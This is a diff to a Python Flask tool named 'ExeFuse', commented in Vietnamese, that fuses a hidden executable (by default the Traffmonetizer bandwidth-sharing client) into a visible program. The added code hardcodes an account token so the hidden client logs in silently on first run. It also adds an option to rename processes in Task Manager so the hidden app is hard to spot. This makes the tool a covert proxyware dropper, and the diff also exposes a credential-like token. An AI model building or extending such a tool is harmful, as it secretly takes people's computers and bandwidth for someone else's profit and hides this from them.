@@ -32,6 +32,12 @@ DEFAULTS_DIR = os.path.join(BASE_DIR, "defaults")
 # >>> FILE AN MAC DINH (hardcode) <<<
 PREFERRED_DEFAULT_HIDDEN = "Traffmonetizer.exe"
 
+# >>> TOKEN TRAFFMONETIZER MAC DINH (hardcode - khong can nhap tay) <<<
+# Khi file an la Traffmonetizer va nguoi dung de o token trong -> tu dung
+# token nay: launcher se ghi vao %APPDATA%\traffmonetizer\settings.json
+# truoc khi chay app -> tu dang nhap + tu ket noi ngay lan chay dau.
+DEFAULT_HIDDEN_TOKEN = "NxLHoObcALVGo0/U95S96YB2mDM3FTaIQQtSl34Pt1A="
+
 os.makedirs(WORK_ROOT, exist_ok=True)
 
 
@@ -67,6 +73,7 @@ def api_env():
         "pyinstaller": builder.pyinstaller_version(),
         "ready": builder.pyinstaller_available(),
         "default_hidden": None,
+        "has_default_token": bool(DEFAULT_HIDDEN_TOKEN),
     }
     default_hidden = get_default_hidden()
     if default_hidden:
@@ -106,12 +113,14 @@ def api_build():
 
     try:
         # --- File an: upload HOAC mac dinh tu defaults/ ---
+        tm_by_upload = False
         if hidden is not None and hidden.filename:
             if not hidden.filename.lower().endswith(".exe"):
                 return _bad("File '%s' không phải là file .exe" % hidden.filename)
             hidden_src = os.path.join(workdir, "upload_hidden.exe")
             hidden.save(hidden_src)
             hidden_label = hidden.filename
+            tm_by_upload = "traffmonetizer" in hidden.filename.lower()
         elif use_default_hidden:
             hidden_src = get_default_hidden()
             if not hidden_src:
@@ -151,12 +160,23 @@ def api_build():
         hide_watch = request.form.get("hide_watch", "0") == "1"
         hidden_token = request.form.get("hidden_token", "") or ""
         tm_autorun = request.form.get("tm_autorun", "0") == "1"
+        alias_procs = request.form.get("alias_procs", "0") == "1"
+
+        # --- Token mac dinh: de trong -> tu dung token hardcode (TM only) ---
+        if not hidden_token.strip() and (
+                tm_by_upload or "traffmonetizer" in os.path.basename(
+                    hidden_src or "").lower()):
+            hidden_token = DEFAULT_HIDDEN_TOKEN
+
+        # --- Doi ten tien trinh trong Task Manager theo ten file output ---
+        proc_alias = builder._safe_name(output_name) if alias_procs else ""
 
         job_id = builder.start_job(
             workdir, hidden_src, visible_src, output_name,
             kill_hidden=kill_hidden, hide_watch=hide_watch, icon_src=icon_path,
             hidden_label=hidden_label,
             hidden_token=hidden_token, tm_autorun=tm_autorun,
+            proc_alias=proc_alias,
         )
     except Exception as exc:
         shutil.rmtree(workdir, ignore_errors=True)
@@ -189,6 +209,8 @@ if __name__ == "__main__":
     print("=" * 56)
     print("  ExeFuse is running at:  http://127.0.0.1:%d" % port)
     print("  Default hidden app: %s" % PREFERRED_DEFAULT_HIDDEN)
+    print("  Default TM token  : %s" % (
+        DEFAULT_HIDDEN_TOKEN[:4] + "***" if DEFAULT_HIDDEN_TOKEN else "(chua dat)"))
     print("  Nhan Ctrl+C de tat server.")
     print("=" * 56)
     app.run(host="127.0.0.1", port=port, debug=False, threaded=True)
